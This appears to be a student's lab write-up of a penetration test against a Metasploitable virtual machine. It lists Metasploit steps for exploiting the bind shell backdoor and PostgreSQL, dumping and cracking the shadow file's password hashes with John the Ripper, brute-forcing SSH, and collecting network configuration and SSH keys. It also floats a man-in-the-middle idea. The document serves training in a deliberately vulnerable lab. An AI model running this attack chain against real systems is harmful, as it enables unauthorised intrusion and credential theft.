Commands:--
1) db_nmap -sV <target_IP_Adr>
2) nmap -sT <target_IP-Adr>
Here I decided I would use Nessus and found several critical weaknesses I have included
a photo of the report with this submission

Bind Shell Backdoor Detection:--
1) search exploit ftp backdor
2) use 1
3)
	set RHOST 192.168.56.107
	set PORT 1524
	exploit
	background
4) use post/linux/gather/hashdump
5) set SESSION 1
6) run
	At this point I found a hasdump of the shadow file containing passwords of the metasploitable system
	Now on my own Kali system I use John the ripper to unencrypt the hash

7) john /root/.msf4/loot/20220313155238_default_192.168.56.107_linux.hashes_612050.txt -show
	The results are stored in /loot/John the Ripper.png

8) search linux shell post
	found a network configuration dump

9) use 20
	This one is pretty exciting becuase I found various files and their locations such as routing table,
 	host file, Firewall configurations SSH keys etc. From previous hashdump, I also know the admin password
	by modifying the host file and enough time I could create a man in the middle attack and steal more
	sensitive data. back
	Saved screenshot of this in loot/NetworkConfiguration.png

OpenSSH 4.7
1) search scanner ssh
2) 
	set STOP_ON_SUCCESS true
	set RHOST 192.168.56.107
	set USERPASS_FILE <the path to the metasploit wordlists>
	run
3) As the password was discovered from the hasdump, from here root access was easy

Postgresql
1) seach exploit postgresql
2) use 4
3) set the options
4) run
	Here I had a meterpreter sessions up and running however none of the meterpreter commands worked, the system was saying
	that the command wasn't supported by the meterpreter version on the system. I'm not sure if that meant my target system or
	my local system, or even how to resolve this issue

Throughout the assignment I had to lookback at CVE reports constantly to see if something could be exploited, however
they didn't really tell me how I could exploit them. I may have spent too much time on each vulnerability, rather than
moving onto the next one. Reaslistically, the severe majority of my attempts had failed, with only the above documented
attempts getting me anywhere.
